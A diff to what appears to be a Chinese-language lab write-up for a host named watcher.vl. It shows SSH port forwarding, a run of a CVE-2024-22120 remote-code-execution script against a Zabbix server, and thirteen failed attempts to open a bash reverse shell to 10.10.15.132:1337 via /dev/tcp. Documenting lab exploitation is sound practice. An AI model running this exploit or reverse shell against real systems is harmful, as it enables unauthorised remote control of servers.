@@ -289,3 +289,39 @@ zabbix@watcher:/var/lib/zabbix/.ssh$
 [★]$ chmod 600 id_rsa
 [★]$ ssh -i id_rsa zabbix@watcher.vl -L 8111:127.0.0.1:8111 -N
 ```
+### 也就试了这么多遍
+```
+[★]$ python3 CVE-2024-22120-RCE.py --ip zabbix.watcher.vl --sid f0e74fc76835e10384a16a84691d7a6d --hostid 10084
+(!) sessionid=e29cc8d946f1a3135fe7ceec60d0ff0d1a3135fe7ceec60d0ff0d
+[zabbix_cmd]>>:  whoami
+zabbix
+
+[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
+Cannot read the response, check connection with the Zabbix server "localhost".
+[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
+Cannot read the response, check connection with the Zabbix server "localhost".
+[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
+Cannot read the response, check connection with the Zabbix server "localhost".
+[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
+Cannot read the response, check connection with the Zabbix server "localhost".
+[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
+Cannot read the response, check connection with the Zabbix server "localhost".
+[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
+Cannot read the response, check connection with the Zabbix server "localhost".
+[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
+Cannot read the response, check connection with the Zabbix server "localhost".
+[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
+Cannot read the response, check connection with the Zabbix server "localhost".
+[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
+Cannot read the response, check connection with the Zabbix server "localhost".
+[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
+Cannot read the response, check connection with the Zabbix server "localhost".
+[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
+Cannot read the response, check connection with the Zabbix server "localhost".
+[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
+Cannot read the response, check connection with the Zabbix server "localhost".
+[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" & 
+Cannot read the response, check connection with the Zabbix server "localhost".
+[zabbix_cmd]>>:   
+
+```
